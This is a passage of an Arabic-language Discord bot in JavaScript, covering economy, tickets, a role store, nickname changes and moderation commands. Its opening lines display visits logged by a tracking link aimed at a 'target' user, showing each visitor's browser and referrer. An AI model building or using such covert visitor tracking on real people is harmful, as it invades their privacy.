        visitsText += `🌐 المتصفح: ${v.userAgent ? v.userAgent.substring(0, 50) + '...' : 'غير معروف'}\n`;
        visitsText += `🔗 المصدر: ${v.referer || 'مباشر'}\n\n`;
      });
      
      const embed = new EmbedBuilder()
        .setTitle(`📊 معلومات الزيارات - ${data.targetUserId}`)
        .setColor(0x4488ff)
        .setDescription(visitsText.substring(0, 4000))
        .addFields(
          { name: '📌 إجمالي الزيارات', value: `${visits.length}`, inline: true },
          { name: '📅 تاريخ الإنشاء', value: `<t:${Math.floor(data.createdAt / 1000)}:F>`, inline: true }
        )
        .setTimestamp();
      
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر حذف_رابط =====
    if (cmd === 'حذف_رابط' || cmd === 'deletelink') {
      const linkId = args[0];
      if (!linkId) {
        return message.reply('⚠️ أدخل معرف الرابط.\nمثال: `!حذف_رابط a1b2c3d4`');
      }
      
      if (linkTracker.deleteLink(linkId)) {
        await message.reply(`✅ تم حذف الرابط \`${linkId}\``);
      } else {
        await message.reply(`❌ الرابط \`${linkId}\` غير موجود.`);
      }
      return;
    }

    // ===== أمر إعادة_تشغيل =====
    if (cmd === 'إعادة_تشغيل' || cmd === 'restart') {
      await message.reply('🔄 جاري إعادة تشغيل البوت...');
      setTimeout(() => process.exit(0), 1000);
      return;
    }

    // ===== أمر تنظيف =====
    if (cmd === 'تنظيف' || cmd === 'clean') {
      try {
        const messages = await message.channel.messages.fetch({ limit: 50 });
        const botMessages = messages.filter(m => m.author.id === client.user.id || m.content.startsWith('!'));
        if (botMessages.size > 0) {
          await message.channel.bulkDelete(botMessages);
          const reply = await message.reply('✅ تم تنظيف الرسائل.');
          setTimeout(() => reply.delete().catch(() => {}), 3000);
        } else {
          await message.reply('📭 لا توجد رسائل للتنظيف.');
        }
      } catch (error) {
        await message.reply(`❌ فشل التنظيف: ${error.message}`);
      }
      return;
    }
  }

  // ============================================================
  // ===== الأوامر العامة =====
  // ============================================================

  // ===== أمر مساعدة =====
  if (cmd === 'مساعدة') {
    const embed = new EmbedBuilder()
      .setTitle('📖 قائمة الأوامر')
      .setColor(0x2b2d31)
      .setDescription(`
**📌 الأوامر العامة:**
\`مساعدة\`, \`معلومات\`, \`سيرفر\`, \`بينق\`, \`تغيير_اسم\`, \`رتب\`, \`رصيد\`, \`تحويل\`, \`يومي\`

**🛡️ أوامر الإدارة (للمتحكمين):**
\`لوحة_المهام\`, \`حظر\`, \`طرد\`, \`كتم\`, \`فك_كتم\`, \`تحذير\`, \`مسح\`, \`قفل\`, \`فتح\`

**🎫 نظام التذاكر:**
\`بانل\`, \`عرض_تذكرة\`, \`لوق_تذكرة\`

**🛒 المتجر:**
\`متجر\`, \`بانل_اضافة_منتج\`
      `)
      .setFooter({ text: 'البادئة: !' });
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر رصيد =====
  if (cmd === 'رصيد') {
    const member = message.mentions.members.first() || message.member;
    const credits = await getCredits(guildId, member.id);
    const embed = new EmbedBuilder()
      .setTitle(`💰 رصيد ${member.user.username}`)
      .setColor(0x2b2d31)
      .setDescription(`**${credits}** 🪙`)
      .setTimestamp();
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر يومي =====
  if (cmd === 'يومي') {
    const user = await getUser(guildId, message.author.id);
    const now = new Date();
    const dailyAmount = 100;
    
    if (user.lastDaily) {
      const lastDaily = new Date(user.lastDaily);
      const hoursDiff = (now - lastDaily) / (1000 * 60 * 60);
      if (hoursDiff < 24) {
        const remaining = Math.ceil(24 - hoursDiff);
        return message.reply(`⏳ يمكنك الحصول على مكافأتك اليومية بعد ${remaining} ساعة.`);
      }
    }
    
    user.credits = (user.credits || 0) + dailyAmount;
    user.lastDaily = now;
    await user.save();
    
    const embed = new EmbedBuilder()
      .setTitle('🎁 مكافأة يومية!')
      .setColor(0x2b2d31)
      .setDescription(`حصلت على **${dailyAmount}** 🪙\nرصيدك الحالي: **${user.credits}** 🪙`)
      .setTimestamp();
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر تحويل =====
  if (cmd === 'تحويل') {
    const target = message.mentions.members.first();
    const amount = parseInt(args[1]);
    
    if (!target) return message.reply('⚠️ منشن العضو المراد التحويل إليه.');
    if (target.id === message.author.id) return message.reply('❌ لا يمكنك التحويل لنفسك.');
    if (isNaN(amount) || amount < 1) return message.reply('⚠️ أدخل مبلغاً موجباً.');
    
    const senderCredits = await getCredits(guildId, message.author.id);
    if (senderCredits < amount) {
      return message.reply(`❌ ليس لديك رصيد كافٍ. رصيدك: **${senderCredits}** 🪙`);
    }
    
    await removeCredits(guildId, message.author.id, amount);
    await addCredits(guildId, target.id, amount);
    
    const embed = new EmbedBuilder()
      .setTitle('💰 عملية تحويل ناجحة')
      .setColor(0x2b2d31)
      .setDescription(`تم تحويل **${amount}** 🪙 إلى ${target}`)
      .setFooter({ text: `تم بواسطة ${message.author.tag}` })
      .setTimestamp();
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر رتب =====
  if (cmd === 'رتب') {
    const embed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setAuthor({
        name: client.user.username,
        iconURL: client.user.displayAvatarURL(),
      })
      .setTitle('🔔 رتب الإشعارات')
      .setDescription('اختر الرتبة التي تريد الحصول عليها أو إزالتها من القائمة المنسدلة أدناه.')
      .setFooter({ text: 'اضغط مرة للحصول على الرتبة، ومرة أخرى لإزالتها.' })
      .setTimestamp()
      .setImage('https://i.imgur.com/7dXe7tM.png');

    const roles = config.uiRolesOptions || ['Game Notice', 'Event Notice', 'Ajr Notice'];
    const options = roles.map(r => ({
      label: r,
      value: r,
      emoji: '🔔',
    }));

    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('roles_dropdown')
        .setPlaceholder(config.uiRolesDropdownLabel || 'اختر الرتبة')
        .addOptions(options)
    );

    await message.channel.send({ embeds: [embed], components: [row] });
    return;
  }

  // ===== أمر بانل (التذاكر) =====
  if (cmd === 'بانل') {
    if (!(await hasPermission(message.member, guildId))) {
      return message.reply('❌ تحتاج صلاحية متحكم.');
    }
    const settings = await getTicketSettings(guildId);
    const embed = new EmbedBuilder()
      .setTitle(config.uiTicketTitle || '🎫 تذاكر دعم فني')
      .setDescription(config.uiTicketDescription || 'اختر القسم المناسب لطلب المساعدة.')
      .setColor(0x2b2d31)
      .setTimestamp()
      .setImage(config.uiTicketImage || config.uiBannerUrl || 'https://i.imgur.com/GkKqN3G.png');
    
    const options = settings.sections.map(s => ({
      label: s.name,
      value: s.name,
      emoji: s.emoji || '📌',
    }));
    if (!options.length) {
      return message.reply('⚠️ لا توجد أقسام مضافة.');
    }
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder().setCustomId('ticket_menu').setPlaceholder('📌 اختر القسم...').addOptions(options)
    );
    await message.channel.send({ embeds: [embed], components: [row] });
    await message.reply('✅ تم إنشاء لوحة التذاكر.');
    return;
  }

  // ===== أمر متجر =====
  if (cmd === 'متجر') {
    const items = await StoreItem.find({ guildId });
    if (!items.length) {
      return message.reply('📭 لا توجد منتجات في المتجر حالياً.');
    }
    const embed = new EmbedBuilder()
      .setTitle(config.uiStoreTitle || '🛒 متجر الرتب')
      .setDescription(config.uiStoreDescription || 'اختر الرتبة التي تريد شراءها.')
      .setColor(0x2b2d31);
    if (config.uiStoreImage) embed.setImage(config.uiStoreImage);
    if (config.storePanelImage) embed.setImage(config.storePanelImage);
    if (config.uiBannerUrl) embed.setImage(config.uiBannerUrl);
    
    const options = items.map(item => {
      const role = message.guild.roles.cache.get(item.roleId);
      return {
        label: role ? role.name : 'رتبة غير موجودة',
        value: item._id.toString(),
        description: `${item.price} 🪙`,
        emoji: '🛒',
      };
    });
    const chunkSize = 25;
    const rows = [];
    for (let i = 0; i < options.length; i += chunkSize) {
      const chunk = options.slice(i, i + chunkSize);
      rows.push(
        new ActionRowBuilder().addComponents(
          new StringSelectMenuBuilder()
            .setCustomId(`store_buy_${i}`)
            .setPlaceholder(`اختر رتبة (${i+1}-${Math.min(i+chunkSize, options.length)})`)
            .addOptions(chunk)
        )
      );
    }
    await message.channel.send({ embeds: [embed], components: rows });
    return;
  }

  // ===== أمر معلومات =====
  if (cmd === 'معلومات') {
    const member = message.mentions.members.first() || message.member;
    const credits = await getCredits(guildId, member.id);
    const embed = new EmbedBuilder()
      .setTitle(`ℹ️ معلومات ${member.user.username}`)
      .setColor(0x2b2d31)
      .setThumbnail(member.user.displayAvatarURL())
      .addFields(
        { name: '🆔 المعرف', value: member.id, inline: true },
        { name: '📅 تاريخ الانضمام', value: member.joinedAt.toDateString(), inline: true },
        { name: '💰 العملات', value: `${credits} 🪙`, inline: true }
      );
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر سيرفر =====
  if (cmd === 'سيرفر') {
    const embed = new EmbedBuilder()
      .setTitle(message.guild.name)
      .setColor(0x2b2d31)
      .setThumbnail(message.guild.iconURL())
      .addFields(
        { name: '👥 الأعضاء', value: `${message.guild.memberCount}`, inline: true },
        { name: '💬 القنوات', value: `${message.guild.channels.cache.size}`, inline: true },
        { name: '👑 المالك', value: `<@${message.guild.ownerId}>`, inline: true }
      );
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر بينق =====
  if (cmd === 'بينق') {
    const embed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setDescription(`🏓 البينق: ${client.ws.ping}ms`);
    if (generalImage) embed.setImage(generalImage);
    await message.channel.send({ embeds: [embed] });
    return;
  }

  // ===== أمر تغيير_اسم =====
  if (cmd === 'تغيير_اسم') {
    const embed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle(config.uiTitle || '✏️ تغيير الاسم')
      .setDescription(config.uiDescription || 'اضغط على الزر أدناه لتغيير اسمك المستعار في السيرفر.')
      .setImage(config.uiBannerUrl || 'https://via.placeholder.com/800x240/1e1f22/5865f2?text=+BANNER+')
      .setFooter({ text: config.uiNoteText || 'يمكنك تغيير اسمك مرة كل 5 ساعات.' })
      .setTimestamp();

    const changeButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('change_name_ui')
        .setLabel('تغيير الاسم')
        .setEmoji('✏️')
        .setStyle(ButtonStyle.Secondary)
    );

    await message.channel.send({ embeds: [embed], components: [changeButton] });
    const reply = await message.reply('✅ تم إنشاء لوحة تغيير الاسم.');
    setTimeout(async () => {
      try { await reply.delete(); } catch (e) {}
      try { await message.delete(); } catch (e) {}
    }, 5000);
    return;
  }

  // ===== أمر لوحة_المهام =====
  if (cmd === 'لوحة_المهام') {
    if (!(await hasPermission(message.member, guildId))) {
      return message.reply('❌ هذا الأمر للمتحكمين فقط.');
    }
    const embed = new EmbedBuilder()
      .setTitle('📋 لوحة المهام الإدارية')
      .setDescription('اختر الإجراء المناسب من الأزرار أدناه.')
      .setColor(0x2b2d31);
    if (config.uiBannerUrl) embed.setImage(config.uiBannerUrl);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('task_create').setLabel('➕ إضافة مهمة').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('task_list').setLabel('📋 عرض المهام').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('task_complete').setLabel('✅ إنهاء مهمة').setStyle(ButtonStyle.Secondary)
    );
    await message.channel.send({ embeds: [embed], components: [row] });
    return;
  }
});

// ============================================================
// ========== معالج التفاعلات ==========
// ============================================================

client.on('interactionCreate', async (interaction) => {
  if (!interaction.guild) return;
  const guildId = interaction.guild.id;
  const config = await getGuildConfig(guildId);

  // ===== القوائم المنسدلة =====
  if (interaction.isStringSelectMenu()) {
    
    // قائمة الرتب
    if (interaction.customId === 'roles_dropdown') {
      const roleName = interaction.values[0];
      let role = interaction.guild.roles.cache.find(r => r.name === roleName);
      if (!role) {
        try {
          role = await interaction.guild.roles.create({
            name: roleName,
            color: '#00ff00',
            reason: `تم إنشاء الرتبة عبر قائمة الرتب بواسطة ${interaction.user.tag}`
          });
        } catch (e) {
          return interaction.reply({ content: '❌ فشل إنشاء الرتبة. تأكد من الصلاحيات.', flags: MessageFlags.Ephemeral });
        }
      }
      if (interaction.member.roles.cache.has(role.id)) {
        await interaction.member.roles.remove(role);
        await interaction.reply({ content: `❌ تم إزالة رتبة ${roleName}.`, flags: MessageFlags.Ephemeral });
      } else {
        await interaction.member.roles.add(role);
        await interaction.reply({ content: `✅ تم إضافة رتبة ${roleName}.`, flags: MessageFlags.Ephemeral });
      }
      return;
    }

    // قائمة التذاكر
    if (interaction.customId === 'ticket_menu') {
      const sectionName = interaction.values[0];
      const settings = await getTicketSettings(guildId);
      const section = settings.sections.find(s => s.name === sectionName);
      if (!section) {
        return interaction.reply({ content: '❌ قسم غير موجود.', flags: MessageFlags.Ephemeral });
      }
      settings.ticketCounter += 1;
      await settings.save();
      const ticketNumber = settings.ticketCounter;
      const role = section.roleId ? interaction.guild.roles.cache.get(section.roleId) : null;
      const username = interaction.user.displayName.replace(/\s/g, '_');
      const channel = await interaction.guild.channels.create({
        name: `${username}`,
        type: ChannelType.GuildText,
        parent: interaction.channel.parentId,
        permissionOverwrites: [
          {
            id: interaction.guild.id,
            deny: [PermissionsBitField.Flags.ViewChannel],
          },
          {
            id: interaction.user.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
          },
          ...(role ? [{
            id: role.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
          }] : [])
        ]
      });
      await createTicketLog(guildId, channel.id, interaction.user.id, sectionName);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('claim_ticket').setLabel('📥 استلام التذكرة').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('add_member_ticket').setLabel('➕ إضافة عضو').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('remove_member_ticket').setLabel('❌ إزالة عضو').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 إغلاق').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('🎫 تذكرة جديدة')
        .setDescription(`**القسم:** ${sectionName}\n**المستخدم:** ${interaction.user}\n**رقم التذكرة:** #${ticketNumber}\nاستخدم الأزرار أدناه لإدارة التذكرة.`)
        .setColor(0x2b2d31)
        .setTimestamp();
      await channel.send({
        content: `${interaction.user} ${role ? `<@&${role.id}>` : ''}`,
        embeds: [embed],
        components: [row]
      });
      await interaction.reply({
        content: `✅ تم إنشاء تذكرتك: ${channel}`,
        flags: MessageFlags.Ephemeral
      });
      return;
    }

    // قائمة شراء المتجر
    if (interaction.customId.startsWith('store_buy_')) {
      const itemId = interaction.values[0];
      const item = await StoreItem.findById(itemId);
      if (!item) {
        return interaction.reply({ content: '❌ المنتج غير موجود.', flags: MessageFlags.Ephemeral });
      }
      const role = interaction.guild.roles.cache.get(item.roleId);
      if (!role) {
        return interaction.reply({ content: '❌ الرتبة غير موجودة حالياً.', flags: MessageFlags.Ephemeral });
      }
      
      const userCredits = await getCredits(guildId, interaction.user.id);
      if (userCredits < item.price) {
        return interaction.reply({ content: `❌ ليس لديك رصيد كافٍ. تحتاج **${item.price}** 🪙، رصيدك: **${userCredits}** 🪙`, flags: MessageFlags.Ephemeral });
      }
      
      await removeCredits(guildId, interaction.user.id, item.price);
      await interaction.member.roles.add(role);
      
      const embed = new EmbedBuilder()
        .setTitle('✅ تم شراء الرتبة بنجاح!')
        .setColor(0x2b2d31)
        .setDescription(`تم شراء رتبة **${role.name}** مقابل **${item.price}** 🪙\nرصيدك المتبقي: **${userCredits - item.price}** 🪙`)
        .setTimestamp();
      if (config.uiStoreImage) embed.setImage(config.uiStoreImage);
      
      await interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
      await logToChannel(guildId, {
        title: '🛒 شراء رتبة',
        color: 0x2b2d31,
        description: `**المشتري:** ${interaction.user}\n**الرتبة:** ${role.name}\n**السعر:** ${item.price} 🪙`
      });
      return;
    }
  }

  // ===== الأزرار =====
  if (interaction.isButton()) {
    
    // زر تغيير الاسم
    if (interaction.customId === 'change_name_ui') {
      const userId = interaction.user.id;
      const last = await getNameCooldown(userId);
      if (last && Date.now() - last.getTime() < 5 * 60 * 60 * 1000) {
        const remaining = Math.ceil((5 * 60 * 60 * 1000 - (Date.now() - last.getTime())) / (60 * 60 * 1000));
        return interaction.reply({ content: `⏳ يمكنك تغيير اسمك بعد ${remaining} ساعة.`, flags: MessageFlags.Ephemeral });
      }
      const modal = new ModalBuilder()
        .setCustomId('change_name_modal')
        .setTitle('✏️ تغيير الاسم')
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('new_name')
              .setLabel('الاسم الجديد')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
              .setMinLength(2)
              .setMaxLength(32)
          )
        );
      await interaction.showModal(modal);
      return;
    }

    // زر إغلاق التذكرة
    if (interaction.customId === 'close_ticket') {
      const log = await getTicketLogByChannel(interaction.channel.id);
      if (!log) {
        return interaction.reply({ content: '❌ هذه القناة ليست تذكرة مسجلة.', flags: MessageFlags.Ephemeral });
      }
      const isController = await hasPermission(interaction.member, guildId);
      const isClaimer = log.claimedBy === interaction.user.id;
      const isCreator = log.userId === interaction.user.id;
      if (!isController && !isClaimer && !isCreator) {
        return interaction.reply({ content: '❌ ليس لديك صلاحية لإغلاق هذه التذكرة.', flags: MessageFlags.Ephemeral });
      }
      await saveTicketMessages(interaction.channel);
      await updateTicketLog(interaction.channel.id, { status: 'closed', closedAt: new Date() });
      await interaction.reply({ content: `🔒 تم إغلاق التذكرة بواسطة ${interaction.user}.`, flags: MessageFlags.Ephemeral });
      await deleteTicketLog(interaction.channel.id);
      setTimeout(async () => {
        try { await interaction.channel.delete(); } catch (e) { console.error('خطأ في حذف التذكرة:', e); }
      }, 3000);
      return;
    }

    // زر استلام التذكرة
    if (interaction.customId === 'claim_ticket') {
      if (!(await hasPermission(interaction.member, guildId))) {
        return interaction.reply({ content: '❌ ليس لديك صلاحية.', flags: MessageFlags.Ephemeral });
      }
      const log = await getTicketLogByChannel(interaction.channel.id);
      if (!log || log.status === 'closed') {
        return interaction.reply({ content: '❌ التذكرة غير متاحة.', flags: MessageFlags.Ephemeral });
      }
      await updateTicketLog(interaction.channel.id, { claimedBy: interaction.user.id, status: 'claimed' });
      await interaction.reply({ content: `✅ ${interaction.user} استلم التذكرة.`, flags: MessageFlags.Ephemeral });
      return;
    }
  }

  // ===== المودالات =====
  if (interaction.isModalSubmit()) {
    if (interaction.customId === 'change_name_modal') {
      const newName = interaction.fields.getTextInputValue('new_name');
      try {
        await interaction.member.setNickname(newName);
        await setNameCooldown(interaction.user.id);
        await interaction.reply({ content: `✅ تم تغيير اسمك إلى **${newName}**.`, flags: MessageFlags.Ephemeral });
      } catch (error) {
        await interaction.reply({ content: '❌ لا يمكن تغيير الاسم. قد لا تملك الصلاحية.', flags: MessageFlags.Ephemeral });
      }
      return;
    }
  }
});

// ============================================================
// ========== تشغيل البوت ==========
// ============================================================

client.login(TOKEN);
